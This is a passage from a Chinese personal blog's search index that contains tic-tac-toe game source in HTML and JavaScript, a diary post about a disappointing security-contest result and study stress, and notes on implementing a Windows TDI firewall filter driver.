class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;澳门皇家赌场&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">h1&#123;color:blue;&#125;</span><br><span class="line">table&#123;background-color:rgb(182,194,154);</span><br><span class="line">width:450px;</span><br><span class="line">height:450px;&#125;</span><br><span class="line">body&#123;background-color:rgb(131,175,155);&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot; &gt;</span><br><span class="line">alert(&quot;欢迎来到棋牌室！&quot;);</span><br><span class="line">var a=new Array(10)</span><br><span class="line">for(var i=0;i&lt;9;i++)</span><br><span class="line">a[i]=0;</span><br><span class="line"></span><br><span class="line">function start()</span><br><span class="line">&#123;</span><br><span class="line">for(var i=0;i&lt;9;i++)</span><br><span class="line">&#123; a[i]=0;</span><br><span class="line">document.getElementById(&quot;srci&quot;+String(i)).src=&quot;back.png&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">coun=0;</span><br><span class="line"></span><br><span class="line">function restart()</span><br><span class="line">&#123;</span><br><span class="line">window.location.reload();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function img_change(id)</span><br><span class="line">&#123;</span><br><span class="line">var x=1;</span><br><span class="line">while(x==1)&#123;</span><br><span class="line">if(id==&quot;div0&quot;&amp;&amp;a[0]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[0]=1;</span><br><span class="line">document.getElementById(&quot;srci0&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div1&quot;&amp;&amp;a[1]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[1]=1;</span><br><span class="line">document.getElementById(&quot;srci1&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div2&quot;&amp;&amp;a[2]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[2]=1;</span><br><span class="line">document.getElementById(&quot;srci2&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div3&quot;&amp;&amp;a[3]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[3]=1;</span><br><span class="line">document.getElementById(&quot;srci3&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div4&quot;&amp;&amp;a[4]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[4]=1;</span><br><span class="line">document.getElementById(&quot;srci4&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div5&quot;&amp;&amp;a[5]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[5]=1;</span><br><span class="line">document.getElementById(&quot;srci5&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div6&quot;&amp;&amp;a[6]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[6]=1;</span><br><span class="line">document.getElementById(&quot;srci6&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div7&quot;&amp;&amp;a[7]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[7]=1;</span><br><span class="line">document.getElementById(&quot;srci7&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else if(id==&quot;div8&quot;&amp;&amp;a[8]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[8]=1;</span><br><span class="line">document.getElementById(&quot;srci8&quot;).src=&quot;timg.png&quot;;</span><br><span class="line">x=0;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line"></span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!(winner()))&#123;</span><br><span class="line">coun++;</span><br><span class="line">Robots_Time();&#125;</span><br><span class="line"></span><br><span class="line">if(!(winner())&amp;&amp;coun==9)</span><br><span class="line">alert(&quot;draw&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">function Robots_Time()</span><br><span class="line">&#123;</span><br><span class="line">var z=1;</span><br><span class="line">while(z==1)&#123;</span><br><span class="line">var ran=Math.random()*9;</span><br><span class="line">ran=parseInt(ran);</span><br><span class="line">if(a[ran]==0)</span><br><span class="line">&#123;</span><br><span class="line">a[ran]=2;</span><br><span class="line">document.getElementById(&quot;srci&quot;+String(ran)).src=&quot;white.png&quot;;</span><br><span class="line">coun++;</span><br><span class="line">z=0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">winner();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function winner()&#123;</span><br><span class="line">if(a[0]==2&amp;&amp;a[1]==2&amp;&amp;a[2]==2||a[0]==2&amp;&amp;a[4]==2&amp;&amp;a[8]==2||a[0]==2&amp;&amp;a[3]==2&amp;&amp;a[6]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[1]==2&amp;&amp;a[4]==2&amp;&amp;a[7]==2||a[2]==2&amp;&amp;a[5]==2&amp;&amp;a[8]==2||a[3]==2&amp;&amp;a[4]==2&amp;&amp;a[5]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[2]==2&amp;&amp;a[4]==2&amp;&amp;a[6]==2||a[6]==2&amp;&amp;a[7]==2&amp;&amp;a[8]==2)&#123;</span><br><span class="line">alert(&quot;You failed&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line"></span><br><span class="line">if(a[0]==1&amp;&amp;a[1]==1&amp;&amp;a[2]==1||a[0]==1&amp;&amp;a[4]==1&amp;&amp;a[8]==1||a[0]==1&amp;&amp;a[3]==1&amp;&amp;a[6]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[1]==1&amp;&amp;a[4]==1&amp;&amp;a[7]==1||a[2]==1&amp;&amp;a[5]==1&amp;&amp;a[8]==1||a[3]==1&amp;&amp;a[4]==1&amp;&amp;a[5]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line">else</span><br><span class="line">if(a[2]==1&amp;&amp;a[4]==1&amp;&amp;a[6]==1||a[6]==1&amp;&amp;a[7]==1&amp;&amp;a[8]==1)&#123;</span><br><span class="line">alert(&quot;You win!&quot;);</span><br><span class="line">return 1;&#125;</span><br><span class="line"></span><br><span class="line">else</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;table border=&quot;1&quot;</span><br><span class="line">cellpadding=&quot;1&quot;</span><br><span class="line">cellspacing=&quot;1&quot;</span><br><span class="line">align=&quot;center&quot;&gt;</span><br><span class="line">&lt;caption&gt;Play with NPC&lt;audio loop=&quot;loop&quot; autoplay=&quot;autoplay/&quot;&gt;</span><br><span class="line">&lt;source src=&quot;I Need To Be In Love.mp3&quot; type=&quot;audio/mpeg&quot;&gt;&lt;/caption&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div0&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci0&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div1&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci1&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div2&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci2&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div3&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci3&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div4&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci4&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div5&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci5&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;tr&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div6&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci6&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div7&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci7&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;td align=&quot;center&quot; id=&quot;div8&quot; onclick=&quot;img_change(id)&quot;&gt; &lt;img src=&quot;back.png&quot; id=&quot;srci8&quot; style=&quot;width:150px;height:150px&quot;&gt;&lt;/td&gt;</span><br><span class="line">&lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;center&gt;&lt;button onclick=&quot;restart()&quot;&gt;重新开始&lt;/button&gt;&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>附地址：<a href="http://139.59.232.52/game.html" target="_blank" rel="noopener">点击与愚蠢的电脑过招井字棋，输了算你牛</a></p>]]></content>
      
      <categories>
          
          <category> skills </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>一点牢骚</title>
      <link href="/1919/06/03/%E4%B8%80%E7%82%B9%E7%89%A2%E9%AA%9A/"/>
      <url>/1919/06/03/%E4%B8%80%E7%82%B9%E7%89%A2%E9%AA%9A/</url>
      <content type="html"><![CDATA[<p>昨天打完信安大赛的华中地区赛，真的是被打到自闭。实在是没想到水平会倒退的这么厉害，或许是本来就这么菜呢。<br>因为这一学期来了之后各种诡异的状态加上后面忙成狗的课加课设，直接将pwn给荒废了很久，本来以为学了就可以随便信手拈来的技巧，在赛场上才感觉到自己的水平有多差，第一天的题实际上不能算是特别难，除了第一道栈拿了三血，其他的本来以为最最擅长的fastbin都tm做不出来，时间稍微长一些，便连各种管理规则都忘得差不多，直到出现报错，才能够想起来有这样那样的检查，甚至在第一天完了之后，我才逐渐想到那个疯狂耗费时间的题的后半段时间都是在一条错误的思路上前进，犯了刚开始做堆时的傻逼错误。</p><p>感觉到了自己有多自大，多煞笔。可能这就是所谓的一瓶不满，半瓶晃荡吧。学到了一些皮毛，就以为自己多么多么厉害，虽然知道自已与其他大佬的差距，但是不愿去接收，只是想着虽然他怎么样怎么样，但是我还咋咋咋的。我记得有人说，过分的谦虚实际上是骄傲，我不知道自己有没有这样过分谦虚，但是我能感觉到自己那即将漫出来的骄傲自大。我不知道怎样控制，本身一个人的性格如此，容易满足便容易骄傲。我向来是一个容易满足的人，我只愿做个谦卑的人。现在常说当今社会多么多么浮躁，我一直以为自己不是他们中的一员，或许我曾经不是，但是我现在一定是了。实话说，太容易迷茫了，我记得有人说，迷茫是因为太闲了，可是我觉得不是，忙忙碌碌与迷茫是不冲突的，甚至忙碌的人更容易迷茫。曾经很容易忘记自己到底为什么要做一件事。我甚至不记得我大一下学期那挣扎许久想出来人活着的理由，这实际上是很悲哀的。我耗费那么大的精力时间去思考，在终于说服了自己之后，我却忘了怎么说服的自己。</p><p>我记得在上大学之前，他们告诉我，当许多年之后你想起你的青春，你可能印象深刻的是你努力学习的时光而不是娱乐的时光，或许是因为还没有过好多年，我的高中记忆已经越来越少，而令我印象深刻的，是那个周六的下午在窗口晒太阳听歌看书的情形，那或许才是我想要的生活。我不像那些与我一同敲代码或是打比赛的人一样有多么的热爱计算机，计算机让我感觉有意思，pwn让我感觉有意思，但都仅限于此了。我感受不到那种发自内心的喜爱，老实说，我甚至想不到多少能够让自己发自内心喜爱的事物。这个角度来讲，计算机，pwn实际上都挺好的，只是它们完全改变了我的生活轨迹，我也不知是好是坏。虽然报专业的时候基本上没报什么计算机相关的专业，但或许是命中注定吧，如果我命中注定要与计算机为伍，我也不愿去排斥。</p><p>太久没写过东西了，懒得在日记本上写了，就在这里发发牢骚，随便东扯西扯。实话说，能够自闭这么久，感觉整个人都要崩溃了。人在自闭的时候，会想要逃避，前些天是想去参军来着，一份逃避，一份参军的心。但是因为这傻逼皮肤病，甚至没法去报。这个时候真的不知道该怎么办了，之前和老爸通过电话谈参军的事，不久就被揭穿了想逃避的心理。压力大的时候不敢跟家里人打电话了，太容易想哭了，真的不想让他们多担心。自己扛着就好了。这么大的人整天胡思乱想，我也不知道如何是好了。相信一切都会过去的吧。</p><p>这个学期还剩一个月就过去了，之后就要搬到新校区了，原先是计划找个实习的，但是这次比赛让我想放弃这个选项了，回家潜心修炼也是一个不错的选项。最终结果如何，到时候都会知道了。</p><p>罢了，就这样吧，一切终将尘埃落定。</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>基于TDI的防火墙部分实现笔记</title>
      <link href="/1919/05/30/%E5%9F%BA%E4%BA%8Etdi%E7%9A%84%E9%98%B2%E7%81%AB%E5%A2%99%E9%83%A8%E5%88%86%E5%AE%9E%E7%8E%B0%E7%AC%94%E8%AE%B0/"/>
      <url>/1919/05/30/%E5%9F%BA%E4%BA%8Etdi%E7%9A%84%E9%98%B2%E7%81%AB%E5%A2%99%E9%83%A8%E5%88%86%E5%AE%9E%E7%8E%B0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<h1 id="TDI-过滤框架："><a href="#TDI-过滤框架：" class="headerlink" title="TDI 过滤框架："></a>TDI 过滤框架：</h1><h2 id="wdm-h"><a href="#wdm-h" class="headerlink" title="wdm.h"></a>wdm.h</h2><p>定义了PDRIVER_OBJECT结构体类型</p><h2 id="tdi-fw-c"><a href="#tdi-fw-c" class="headerlink" title="tdi_fw.c"></a>tdi_fw.c</h2><ol><li>c_n_a_device： 驱动生成设备  </li><li>d_n_d_device：删除设备</li><li>Devicepatch：唯一的设备分发函数 ，如果能get_original_devobj找到old_devobj就调用IoSkipCurrentIrpStackLocation栈中得到请求,再IoCallDriver将二者发到下层（实际：对请求（IRP）的主功能号（irps-&gt;MajorFunction）进行处理。<br>(<em>ps:次功能号：irps-&gt;MiniorFunction</em>)<br>对于特定请求：如IRP_MJ_CREATE ，先tdi_create 进行过滤得到结果，tdi_dispatch_complete 为完成函数，通过result来进行处理</li><li>get_origin_devobj tcp/ip/udp 三对设备及其指针匹配</li></ol><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><ol><li>Onload 删除＋解绑所有已生成和绑定的设备</li><li>DriverEntry 驱动入口＋分发函数+生成过滤设备并绑定三种设备（c_n_a_device)</li></ol><h1 id="过滤生成请求"><a href="#过滤生成请求" class="headerlink" title="过滤生成请求"></a>过滤生成请求</h1><h2 id="disp-obj-c："><a href="#disp-obj-c：" class="headerlink" title="disp_obj.c："></a>disp_obj.c：</h2><ol><li><p>tdi_create: 对于 IRP_MJ_CREATE 请求的过滤 ，生成一个文件对象有两种可能：</p><ul><li>TdiTransportAddress：表明生成传输层地址</li><li>TdiConnectionContext： 表明生成连接终端</li></ul><p>TDI先生成1，再2，再用控制请求将二者连接起来</p><p>1.1 生成传输层地址时。询问被打开的文件对象来获得ip地址和端口，调用TdiBuildInternalDeviceControlIrp分配空的请求,此请求需要在Passive Level 进行调用<br>Ps: 完成函数一般在DisPatch level </p><p>2.1  连接终端的结构：CONNECTION_CONTEXT， 可以从ea中得到</p><p>为了将 文件对象 与 连接上下文 对应起来，可以使用hash表存储（ot_add_fileobj）<br>同理存储 文件对象 与 生成地址 对应起来</p></li><li><p>tdi_create_addrobj_complete/2  从上面的生成的传输层地址得到生成的IP地址（32位长整数即4字节）和端口（16字节整数）</p></li></ol><h1 id="控制请求"><a href="#控制请求" class="headerlink" title="控制请求"></a>控制请求</h1><h2 id="disp-obj-c"><a href="#disp-obj-c" class="headerlink" title="disp_obj.c"></a>disp_obj.c</h2><ol><li><p>两种控制请求（起相同的作用）：</p><ul><li>IRP_MJ_DEVICE_CONTROL：应用层向驱动层发送设备  </li><li><p>IRP_MJ_INTERNAL_DEVICE_CONTROL：内核内部发送设备控制命令</p><p>次功能号有：</p><ol><li>TDI_ASSOCIATE_ADDRESS：将传输层地址对象(IP)和连接对象(FileObj)连接起来,即与连接终端中使用hash表存储的文件对象与连接上下文这个组合连接。<br>使得：得到连接上下文对象时，能够立刻知道使用的本地地址。<br>方法：从栈空间参数中得到上面传入的传输层地址的文件的句柄并将其转化（ObReferenceObjectByHandle）为文件对象指针（addrobj）,ot_find_fileobj找到保存过这个连接上下文所对应的表单元ote_conn，使用<br>ote_conn-&gt;associated_fileobj= addrobj 将其连接<br>使得：将 连接上下文指针 与 地址文件对象指针 连接起来。 //？？上面？<br>方法：使用另一个表：ot_add_conn_ctx</li></ol><p>三者互联： 连接上下文指针–地址文件对象指针–传输层地址</p><ol start="2"><li><p>TDI_DISASSOCIATE_ADDRESS<br>上面功能的反向</p></li><li><p>TDI_CONNECT<br>本地试图连接外界时会发生的请求<br>a. @1. 用户进程使用的本机地址：获取当前请求的当前栈空间，判断请求类型然后得到以前保存的连接对象和传输层地址等等。<br>b. @2. 用户试图连接的远程地址：从irps的参数中得到。</p></li><li><p>TDI_SEND/TDI_RECEIVE<br>流式传输，对应TCP<br>使得：得到连接及相关信息<br>方法：irps-&gt;FileObject 就是连接的文件对象，信息保存在ote_conn中，可以得到连接上下文的指针，地址端口等<br>使得：得到要发送或接收的数据<br>方法：irp-&gt;MdlAddress就是含有数据的MDL的指针</p></li><li><p>TDI_SEND_DATAGRAM/TDI_RECEIVE_DATAGRAM<br>报式传输，对应UDP<br>使得：获取地址<br>方法：因为没有连接的概念，所以查询到的直接就是ote_addr<br>其他与tcp一致</p></li><li><p>TDI_SET_EVENT_HANDLER<br>设置事件回调请求，即侦听，当外部连接我方端口时回调函数被调用<br>EventType 事件种类，EventHandler 回调函数</p></li></ol><p>直接获取发送函数的过滤</p><p>Netbt(基于TCP/IP的NetBios协议），在IRP_MJ_DEVICE_CONTROL的功能码为IOCTL_TDI_QUERY_DIRECT_SEND_HANDLER时，直接获取TCP协议驱动的内部函数TCPSenddata的指针来进行数据发送，即不通过TDI_SEND请求<br>处理：tcpsenddata在调用后会返回在DeviceIoControl.Type3InputBuffer<br>可以因此获得指针之后调用tdi_dispatch_complete让真实设备完成请求，之后将结果进行转换</p><ol start="7"><li>清理请求的过滤IRP_MJ_CLEANUP<br>将IRP_MJ_DEVICE_CONTROL尝试转换为IRP_MJ_INTERNAL_CONTROL，转换不成功直接下发，成功则视为internal来进行过滤</li></ol></li></ul></li></ol>]]></content>
      
      <categories>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
            <tag> firewall </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
